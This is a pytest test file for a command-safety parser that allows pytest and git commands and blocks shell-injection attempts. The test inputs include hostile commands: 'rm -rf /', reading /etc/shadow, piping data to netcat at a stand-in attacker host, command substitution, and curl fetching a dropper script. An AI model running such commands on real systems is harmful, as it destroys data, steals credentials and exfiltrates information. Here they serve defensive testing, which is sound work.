import pytest
from layer7.command_parser import SafeCommandParser, EvasionThreat


@pytest.fixture
def parser():
    return SafeCommandParser()


def test_allowed_pytest_command(parser):
    res = parser.analyze("python -m pytest tests/ -v")
    assert res.is_safe is True
    assert res.base_command == "python -m pytest"
    assert res.risk == "LOW"


def test_allowed_compileall_command(parser):
    res = parser.analyze("python -m compileall sentinel/")
    assert res.is_safe is True
    assert res.base_command == "python -m compileall"


def test_allowed_git_commands(parser):
    res_status = parser.analyze("git status -s")
    assert res_status.is_safe is True

    res_diff = parser.analyze("git diff --stat")
    assert res_diff.is_safe is True


def test_chaining_semicolon_blocked(parser):
    res = parser.analyze("python -m pytest ; rm -rf /")
    assert res.is_safe is False
    assert f"threat:{EvasionThreat.COMMAND_CHAINING.value}" in res.reasons
    assert res.risk == "CRITICAL"


def test_chaining_and_operator_blocked(parser):
    res = parser.analyze("python -m pytest && cat /etc/shadow")
    assert res.is_safe is False
    assert f"threat:{EvasionThreat.COMMAND_CHAINING.value}" in res.reasons


def test_pipe_redirection_blocked(parser):
    res = parser.analyze("git status | nc attacker.internal 4444")
    assert res.is_safe is False
    assert f"threat:{EvasionThreat.PIPE_REDIRECTION.value}" in res.reasons


def test_command_substitution_blocked(parser):
    res = parser.analyze("python -m pytest $(whoami)")
    assert res.is_safe is False
    assert f"threat:{EvasionThreat.COMMAND_SUBSTITUTION.value}" in res.reasons

    res_bt = parser.analyze("python -m pytest `id`")
    assert res_bt.is_safe is False
    assert f"threat:{EvasionThreat.COMMAND_SUBSTITUTION.value}" in res_bt.reasons


def test_arbitrary_python_eval_blocked(parser):
    res = parser.analyze("python -c 'import os; os.system(\"id\")'")
    assert res.is_safe is False
    assert res.risk in {"HIGH", "CRITICAL"}


def test_unallowlisted_binary_blocked(parser):
    res = parser.analyze("curl https://malicious.internal/drop.sh")
    assert res.is_safe is False
    assert f"threat:{EvasionThreat.COMMAND_NOT_ALLOWLISTED.value}" in res.reasons
